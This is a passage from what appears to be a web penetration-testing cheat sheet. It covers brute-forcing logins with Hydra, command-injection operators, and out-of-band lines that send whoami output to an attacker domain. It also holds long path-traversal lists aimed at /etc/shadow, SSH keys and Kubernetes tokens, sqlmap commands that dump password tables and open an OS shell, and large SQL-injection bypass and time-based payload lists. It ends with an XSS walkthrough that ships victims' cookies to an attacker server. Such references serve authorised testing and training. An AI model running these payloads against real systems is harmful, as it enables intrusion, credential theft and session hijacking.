## The -maxtime flag offers to end the ongoing fuzzing after the specified time in seconds:
ffuf -w wordlist.txt -u http://example.com/FUZZ -maxtime 60
## Number of threads:
ffuf -w wordlist.txt -u http://example.com/FUZZ -t 64
```

### **Login Brute Force**

**Hydra**

```bash
# Basic auth attacks (brute-force)
hydra -L <USERS_LIST> -P <PW_LIST> <TARGET_IP> http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
```

### Information Disclosure

* checks every page source searching sensitive data (prevalent into comments)
* checks robots.txt file

[Information Disclosure - Portswigger Academy](https://app.gitbook.com/s/rRWtuMw6xkkeDjZfkcWC/portswigger-web-security-academy/information-disclosure)

### **Command Injection**

#### Ways of injecting OS commands <a href="#ways-of-injecting-os-commands" id="ways-of-injecting-os-commands"></a>

```bash
&
&&
|
||
;
Newline (0x0a or \n)
`
injected command `
$(
injected command )
```

#### Useful commands <a href="#useful-commands" id="useful-commands"></a>

| Purpose of command    | Linux         | Windows         |
| --------------------- | ------------- | --------------- |
| Name of current user  | `whoami`      | `whoami`        |
| Operating system      | `uname -a`    | `ver`           |
| Network configuration | `ifconfig`    | `ipconfig /all` |
| Network connections   | `netstat -an` | `netstat -an`   |
| Running processes     | `ps -ef`      | `tasklist`      |

#### Blind OS command injection vulnerabilities <a href="#blind-os-command-injection-vulnerabilities" id="blind-os-command-injection-vulnerabilities"></a>

```bash
#blind OS command injection using time delays
& ping -c 10 127.0.0.1 &

#blind OS command injection by redirecting output
& whoami > /var/www/static/whoami.txt &

#blind OS command injection using out-of-band (OAST) techniques
& nslookup kgji2ohoyw.web-attacker.com &
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
wwwuser.kgji2ohoyw.web-attacker.com
```

### **Path/Directory Traversal**

```url
#Linux
https://insecure-website.com/loadImage?filename=../../../../../../etc/passwd

#Windows
https://insecure-website.com/loadImage?filename=..\..\..\..\..\..\windows\win.ini
```

#### **Other Payloads**

```url
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
. = %u002e
/ = %u2215
\ = %u2216
. = %c0%2e, %e0%40%ae, %c0ae
/ = %c0%af, %e0%80%af, %c0%2f
\ = %c0%5c, %c0%80%5c
..././
...\.\
..;/
..;/..;/sensitive.txt 
. = %252e
/ = %252f
\ = %255c
file:///etc/passwd
http://127.0.0.1:8080
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/self/cwd/index.php
/proc/self/cwd/main.py
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/kubernetes.io/serviceaccount/certificate
/var/run/secrets/kubernetes.io/serviceaccount
/var/lib/mlocate/mlocate.db
/var/lib/mlocate.db
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail
%252e%252e/%252e%252e/%252e%252e//etc/passwd
%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../etc/passwd
../../../../etc/passwd
../../../etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
/../../../../../../../../../../../etc/passwd%00.jpg
/../../../../../../../../etc/passwd%00.gif
```

### **SQL Injection**

[SQLi Portswigger Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### **SQLMap**

```bash
sqlmap -r <REQUEST_FILE> -p <POST_PARAMETER>
sqlmap -r Post.req

sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title

sqlmap -u "http://10.10.10.10/file.php?id=1" -p id          #GET Method
sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin"      #POST Method
```

**Get database if injection Exists**

```bash
sqlmap -r login.req --dbs
sqlmap -u "http://10.10.10.10/file.php?id=1" --dbs    #determine the databases:
sqlmap -u "http://10.10.10.10/file.php?id=1" -p id --dbs    #GET Method
sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" --dbs #POST Method

# List databases
sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title --dbs
sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP --tables
sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP -T users --columns
sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP -T users -C admin,password,email --dump
```

**Get Tables in a Database**

```bash
sqlmap -r login.req -D dbname --tables    #determine the tables:
sqlmap -u "http://10.10.10.10/file.php?id=1" -D dbname --common-tables    #if tables not available, guess tables using common names
sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname --tables        #GET Method
sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname --tables #POST Method
```

**Get data in a Database tables**

```bash
sqlmap -r login.req -D dbname -T table_name --dump
sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dump      #GET Method
sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump   #POST Method
```

**Get OS-Shell**

```bash
sqlmap -u "http://10.10.10.10/file.php?id=1" --os-shell
```

#### **SQLi Auth Bypass Payloads**

```sql
0' or '0' = '0
1' or '1' = '1
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
' OORR 1<2 #
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
' and 1='1
' and a='a
 or 1=1
 or true
' or ''='
" or ""="
1′) and '1′='1–
' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
 and 1=1
 and 1=1–
' and 'one'='one
' and 'one'='one–
' group by password having 1=1--
' group by userid having 1=1--
' group by username having 1=1--
 like '%'
 or 0=0 --
 or 0=0 #
 or 0=0 –
' or         0=0 #
' or 0=0 --
' or 0=0 #
' or 0=0 –
" or 0=0 --
" or 0=0 #
" or 0=0 –
%' or '0'='0
 or 1=1
 or 1=1--
 or 1=1/*
 or 1=1#
 or 1=1–
' or 1=1--
' or '1'='1
' or '1'='1'--
' or '1'='1'/*
' or '1'='1'#
' or '1′='1
' or 1=1
' or 1=1 --
' or 1=1 –
' or 1=1--
' or 1=1;#
' or 1=1/*
' or 1=1#
' or 1=1–
') or '1'='1
') or '1'='1--
') or '1'='1'--
') or '1'='1'/*
') or '1'='1'#
') or ('1'='1
') or ('1'='1--
') or ('1'='1'--
') or ('1'='1'/*
') or ('1'='1'#
'or'1=1
'or'1=1′
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 –
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1–
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1′='1–
) or ('1′='1–
' or 1=1 LIMIT 1;#
'or 1=1 or ''='
"or 1=1 or ""="
' or 'a'='a
' or a=a--
' or a=a–
') or ('a'='a
" or "a"="a
") or ("a"="a
') or ('a'='a and hi") or ("a"="a
' or 'one'='one
' or 'one'='one–
' or uid like '%
' or uname like '%
' or userid like '%
' or user like '%
' or username like '%
' or 'x'='x
') or ('x'='x
" or "x"="x
' OR 'x'='x'#;
'=' 'or' and '=' 'or'
' UNION ALL SELECT 1, @@version;#
' UNION ALL SELECT system_user(),user();#
' UNION select table_schema,table_name FROM information_Schema.tables;#
admin' and substring(password/text(),1,1)='7
' and substring(password/text(),1,1)='7
' or 1=1 limit 1 -- -+
'="or'
' and 'x'='x
admin' or 1=1;-- 
?id=1' order by 1 --+
?id=1' and "a"="a"--+
?id=1' and database()="securtiy"--+
?id=1' and substring(database(),1,1)="a"--+
?id=1' and sleep(2) and "a"="a"--+
?id=1' and sleep(2) and substring(database(),1,1)="a"--+
'+||+1=1#
```

#### **SQLi Payloads**

```sql
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
/*…*/ 
+		addition, concatenate (or space in url)
||		(double pipe) concatenate
%		wildcard attribute indicator
@variable	local variable
@@variable	global variable
AND 1
AND 0
AND true
AND false
1-false
1-true
1*56
-2
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+
1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames having 1=1 --
-1' UNION SELECT 1,2,3--+
' UNION SELECT sum(columnname ) from tablename --
-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@
1 AND (SELECT * FROM Users) = 1	
' AND MID(VERSION(),1,1) = '5';
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
,(select * from (select(sleep(10)))a)
%2c(select%20*%20from%20(select(sleep(10)))a)
';WAITFOR DELAY '0:0:30'--
 OR 1=1
 OR 1=0
 OR x=x
 OR x=y
 OR 1=1#
 OR 1=0#
 OR x=x#
 OR x=y#
 OR 1=1-- 
 OR 1=0-- 
 OR x=x-- 
 OR x=y-- 
 OR 3409=3409 AND ('pytW' LIKE 'pytW
 OR 3409=3409 AND ('pytW' LIKE 'pytY
 HAVING 1=1
 HAVING 1=0
 HAVING 1=1#
 HAVING 1=0#
 HAVING 1=1-- 
 HAVING 1=0-- 
 AND 1=1
 AND 1=0
 AND 1=1-- 
 AND 1=0-- 
 AND 1=1#
 AND 1=0#
 AND 1=1 AND '%'='
 AND 1=0 AND '%'='
 AND 1083=1083 AND (1427=1427
 AND 7506=9091 AND (5913=5913
 AND 1083=1083 AND ('1427=1427
 AND 7506=9091 AND ('5913=5913
 AND 7300=7300 AND 'pKlZ'='pKlZ
 AND 7300=7300 AND 'pKlZ'='pKlY
 AND 7300=7300 AND ('pKlZ'='pKlZ
 AND 7300=7300 AND ('pKlZ'='pKlY
 AS INJECTX WHERE 1=1 AND 1=1
 AS INJECTX WHERE 1=1 AND 1=0
 AS INJECTX WHERE 1=1 AND 1=1#
 AS INJECTX WHERE 1=1 AND 1=0#
 AS INJECTX WHERE 1=1 AND 1=1--
 AS INJECTX WHERE 1=1 AND 1=0--
 WHERE 1=1 AND 1=1
 WHERE 1=1 AND 1=0
 WHERE 1=1 AND 1=1#
 WHERE 1=1 AND 1=0#
 WHERE 1=1 AND 1=1--
 WHERE 1=1 AND 1=0--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
 ORDER BY 1-- 
 ORDER BY 2-- 
 ORDER BY 3-- 
 ORDER BY 4-- 
 ORDER BY 5-- 
 ORDER BY 6-- 
 ORDER BY 7-- 
 ORDER BY 8-- 
 ORDER BY 9-- 
 ORDER BY 10-- 
 ORDER BY 11-- 
 ORDER BY 12-- 
 ORDER BY 13-- 
 ORDER BY 14-- 
 ORDER BY 15-- 
 ORDER BY 16-- 
 ORDER BY 17-- 
 ORDER BY 18-- 
 ORDER BY 19-- 
 ORDER BY 20-- 
 ORDER BY 21-- 
 ORDER BY 22-- 
 ORDER BY 23-- 
 ORDER BY 24-- 
 ORDER BY 25-- 
 ORDER BY 26-- 
 ORDER BY 27-- 
 ORDER BY 28-- 
 ORDER BY 29-- 
 ORDER BY 30-- 
 ORDER BY 31337-- 
 ORDER BY 1# 
 ORDER BY 2# 
 ORDER BY 3# 
 ORDER BY 4# 
 ORDER BY 5# 
 ORDER BY 6# 
 ORDER BY 7# 
 ORDER BY 8# 
 ORDER BY 9# 
 ORDER BY 10# 
 ORDER BY 11# 
 ORDER BY 12# 
 ORDER BY 13# 
 ORDER BY 14# 
 ORDER BY 15# 
 ORDER BY 16# 
 ORDER BY 17# 
 ORDER BY 18# 
 ORDER BY 19# 
 ORDER BY 20# 
 ORDER BY 21# 
 ORDER BY 22# 
 ORDER BY 23# 
 ORDER BY 24# 
 ORDER BY 25# 
 ORDER BY 26# 
 ORDER BY 27# 
 ORDER BY 28# 
 ORDER BY 29# 
 ORDER BY 30#
 ORDER BY 31337#
 ORDER BY 1 
 ORDER BY 2 
 ORDER BY 3 
 ORDER BY 4 
 ORDER BY 5 
 ORDER BY 6 
 ORDER BY 7 
 ORDER BY 8 
 ORDER BY 9 
 ORDER BY 10 
 ORDER BY 11 
 ORDER BY 12 
 ORDER BY 13 
 ORDER BY 14 
 ORDER BY 15 
 ORDER BY 16 
 ORDER BY 17 
 ORDER BY 18 
 ORDER BY 19 
 ORDER BY 20 
 ORDER BY 21 
 ORDER BY 22 
 ORDER BY 23 
 ORDER BY 24 
 ORDER BY 25 
 ORDER BY 26 
 ORDER BY 27 
 ORDER BY 28 
 ORDER BY 29 
 ORDER BY 30 
 ORDER BY 31337 
 RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
 RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
%' AND 8310=8310 AND '%'='
%' AND 8310=8311 AND '%'='
 and (select substring(@@version,1,1))='X'
 and (select substring(@@version,1,1))='M'
 and (select substring(@@version,2,1))='i'
 and (select substring(@@version,2,1))='y'
 and (select substring(@@version,3,1))='c'
 and (select substring(@@version,3,1))='S'
 and (select substring(@@version,3,1))='X'
sleep(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
" or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
1) or benchmark(10000000,MD5(1))#
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
")) or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#
pg_sleep(5)--
1 or pg_sleep(5)--
" or pg_sleep(5)--
' or pg_sleep(5)--
1) or pg_sleep(5)--
") or pg_sleep(5)--
') or pg_sleep(5)--
1)) or pg_sleep(5)--
")) or pg_sleep(5)--
')) or pg_sleep(5)--
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)='
or SLEEP(5)
or SLEEP(5)#
or SLEEP(5)--
or SLEEP(5)="
or SLEEP(5)='
waitfor delay '00:00:05'
waitfor delay '00:00:05'--
waitfor delay '00:00:05'#
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))--
benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))--
or benchmark(50000000,MD5(1))#
pg_SLEEP(5)
pg_SLEEP(5)--
pg_SLEEP(5)#
or pg_SLEEP(5)
or pg_SLEEP(5)--
or pg_SLEEP(5)#
'\"
AnD SLEEP(5)
AnD SLEEP(5)--
AnD SLEEP(5)#
&&SLEEP(5)
&&SLEEP(5)--
&&SLEEP(5)#
' AnD SLEEP(5) ANd '1
'&&SLEEP(5)&&'1
ORDER BY SLEEP(5)
ORDER BY SLEEP(5)--
ORDER BY SLEEP(5)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+benchmark(3200,SHA1(1))+'
+ SLEEP(10) + '
RANDOMBLOB(500000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
RANDOMBLOB(1000000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
'|| pg_sleep(10) --+
```

### **HTML Injection**

```html
<h1>HTML</h1>
<h1>html</h1>
<h2>HTML</h2>
<h3>HTML</h3>
<h4>HTML</h4>
<h5>HTML</h5>
<h6>HTML</h6>
<pre>HTML</pre>
<p>HTML</p>
<i>HTML</i>
<a href="https://www.google.com">HTML</a>
<abbr title="HTML">HTML</abbr>
<acronym title="Armour Infosec">AI</acronym>
<address>address,address</address>
<article><h2>Armour Infosec</h2></article>
<audio controls><source src="demo.ogg" type="audio/ogg"><source src="demo.mp3" type="audio/mpeg"></audio>
<b>HTML</b>
<h1>HTML</h1><!--
qq<h1>HTML</h1>
qq<h1>HTML</h1>qq
$$\<u>HTML</u>{}$$
%3Ch1%3EHTML%3C%2Fh1%3E
&lt;h1&gt;HTML&lt;/h1&gt;
&#60;h1&#62;HTML&#60;/h1&#62;
<iframe src="https://www.google.com" title="test"></iframe>
123<h1>HTML</h1>
<h1>HTML</h1>123
123<h1>HTML</h1>123
%253Ch1%253EHTML%253C%252Fh1%253E
<iframe id="if1" src="https://www.google.com"></iframe>
<iframe id="if2" src="https://www.google.com"></iframe>
PGgxPkhUTUw8L2gxPg==
UEdneFBraFVUVXc4TDJneFBnPT0=
<<h1>HTML</h1>
<<h1>HTML</h1>>
<<h1>html</h1>>
%253Ch1%253EHTML%253C%252Fh1%253E<h1>Html</h1>
<pre>HTML</pre>
<p>HTMLinjection here</p>
<i>HTML</i>
<u>Html</u>
<mark>Html</mark>
<a href="https://www.google.com">HTML</a>
<b>HTML</b>
<h1>HTML</h1><!--
qq<h1>HTML</h1>
qq<h1>HTML</h1>qq
%3Ch1%3EHTML%3C%2Fh1%3E
%253Ch1%253EHTML%253C%252Fh1%253E
&lt;h1&gt;HTML&lt;/h1&gt;
&amp;lt;h1&amp;gt;HTML&amp;lt;/h1&amp;gt;
&#60;h1&#62;HTML&#60;/h1&#62;
<iframe src="https://www.google.com" title="test"></iframe>
123<h1>HTML</h1>
<h1>HTML</h1>123
123<h1>HTML</h1>123
%253Ch1%253EHTML%253C%252Fh1%253E
<iframe id="if1" src="https://www.google.com"></iframe>
<iframe id="if2" src="https://www.google.com"></iframe>
<<h1>HTML</h1>
<<h1>HTML</h1>>
<<h1>html</h1>>
%253Ch1%253EHTML%253C%252Fh1%253E
<div>HTML</div>
%3Ci%3Ehtml%3C%2Fi%3E
%253Ci%253Ehtml%253C%252Fi%253E
<style>h1 {color:red;}</style><h1>This is a heading</h1>
<textarea id="HTML" name="HTML" rows="4" cols="50">Html injected</textarea>
<head><base href="https://www.google.com" target="_blank"></head>
<span style="color:blue;font-weight:bold">html</span>
<abbr title="HTML">HTML</abbr>
<acronym title="Armour Infosec">AI</acronym>
<address>address,address</address>
<article><h2>Armour Infosec</h2></article>
<audio controls><source src="demo.ogg" type="audio/ogg"><source src="demo.mp3" type="audio/mpeg"></audio>
<bdi>Html</bdi>injection
<bdo dir="rtl">HTML html</bdo>
<blockquote cite="http://google.com">HTML Injection</blockquote>
<body><h1>HTML html</h1></body>
Html<br>line breaks<br>injection
<button type="button">Click Me!</button> 
<canvas id="myCanvas">draw htmli</canvas>
<caption>Html</caption>
<cite>Html Html</cite> 
<code>Html</code>
<colgroup><col span="2" style="background-color:red"></colgroup>
<data value="21053">test html</data>
<datalist id="html"><option value="html"></datalist>
<dl><dt>Html</dt></dl>
<dt>Html</dt>
<dd>Html</dd>
<del>Html</del>
<ins>Html</ins>
<details><summary>HTML</summary><p>html html</p></details>
<dfn>HTML</dfn>
<dialog open>Html</dialog> 
<dialog close></dialog>
<em>Html</em>
<embed type="text/html" src="index.html" width="500" height="200"> 
<fieldset><legend>hello:</legend><label for="fname">First name:</label><input type="text"id="fname"name="fname"><br><br><inputtype="submit" value="Submit"></fieldset>
<figure>Html</figure>
<figcaption>Html Html</figcaption>
<footer>HTML html</footer>
<form method="GET">Username: <input type="text" name="username" value="" /> <br />Password: <input type="password" name="passwd" value="" /> <br /><input type="submit" name="submit" value="login" /></form>
<form method="POST">Username: <input type="text" name="username" value="" /> <br />Password: <input type="password" name="passwd" value="" /> <br /><input type="submit" name="submit" value="login" /></form>
<head><title>html</title></head>
<header>HTML html</header>
<hr>html<hr>
<img src="index.jpg" alt="Girl in a jacket" width="500" height="600">
<input type="text" id="name" name="name">
<ins>red</ins>
<kbd>Ctrl</kbd>
label for="html">HTML</label><br>
<legend>Html</legend>
<li>Html</li>
<main>Html</main>
<map name="workmap">Html</map>
<meter id="html" value="2" min="0" max="10">2 out of 10</meter>
<nav>Html</nav>
<noscript>Sorry, your browser does not support Html</noscript>
<ol>Html</ol>
<optgroup label="Html"></optgroup>
<option value="Html>Html</option>
<pre>Html</pre>
<progress id="html" value="32" max="100"> 32% </progress>
<q>Html Html</q>
<s>Only 50 tickets left</s>
<samp>File not found</samp>
<section>HTML</section>
<select name="cars" id="cars"></select>
<small>HTML rocks</small>
<strong>Html</strong>
<sub>Html</sub>
<summary>Html</summary>
<sup>Html</sup>
<svg width="100" height="100"><circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" /></svg>
<table><th>HTML</th><th>HTML</th></table>
<time>10:10</time>
<time datetime="2008-02-14 20:00">HTML</time>
<ul>html</ul>
<var>Html</var>
<video width="320" height="240" controls></video>
<wbr>HTML html<wbr>
<div>HTML</div>
%3Ci%3Ehtml%3C%2Fi%3E
%253Ci%253Ehtml%253C%252Fi%253E
<body style="background-color:red">
```

### **Encoding**

**XML Encoding**

```xml
<stockCheck>
    <productId>
        123
    </productId>
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```

[SQL injection with filter bypass via XML encoding](https://dev-angelist.gitbook.io/writeups-and-walkthroughs/portswigger-web-security-academy/essential-skills/obfuscating-attacks-using-encodings/sql-injection-with-filter-bypass-via-xml-encoding)

#### Unicode Escaping

```javascript
\u 
eval()
eval("\u0061lert(1)")
<a href="javascript:\u{00000000061}alert(1)">Click me</a>
```

#### Hex Escaping

```javascript
\x
eval("\x61lert")
0x
0x53454c454354
```

#### Octal Escaping

```javascript
\141
eval("\141lert(1)")
```

Multiple Encodings

```javascript
<a href="javascript:&bsol;u0061lert(1)">Click me</a>
<a href="javascript:\u0061lert(1)">Click me</a>
<a href="javascript:alert(1)">Click me</a>
```

#### SQL CHAR() function

```sql
CHAR(0x53)
CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
```

### **XSS**

Check an example:

```javascript
<script>alert("hack :)")</script>
```

**Hijack cookie through xss**

there are four components as follows:

* attacker client pc
* attacker logging server
* vulnerable server
* victim client pc

1. attacker: first finds a vulnerable server and its breach point.
2. attacker: enter the following snippet in order to hijack the cookie kepts by victim client pc (p.s.: the ip address, 192.168.99.102, belongs to attacker logging server in this example):

```javascript
<script>var i = new Image();i.src="http://192.168.99.102/log.php?q="+document.cookie;</script>
```

3. attacker: log into attacker logging server (P.S.: it is 192.168.99.102 in this example), and execute the following command:

```bash
nc -vv -k -l -p 80
```

4. attacker: when victim client pc browses the vulnerable server, check the output of the command above.
5. attacker: after obtaining the victim’s cookie, utilize a firefox’s add-on called Cookie Quick Manager to change to the victim’s cookie in an effort to hijack the victim’s privilege.

**XSSer**

```bash
xsser --url 'http://<TARGET_IP>/index.php?page=dns-lookup.php' -p
'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'

xsser --url 'http://<TARGET_IP>/index.php?page=dns-lookup.php' -p
'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto

xsser --url 'http://<TARGET_IP>/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"

xsser --url "http://<TARGET_IP>/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=2&user-poll-php-submit-button=Submit+Vote" --Fp "<script>alert(1)</script>"

## Authenticated XSSer
xsser --url "http://<TARGET_IP>/htmli_get.php?firstname=XSS&lastname=hi&form=submit" --cookie="PHPSESSID=lb3rg4q495t9sqph907sdhjgg1; security_level=0" --Fp "<script>alert(1)</script>"
```

#### XSS Payloads

```javascript
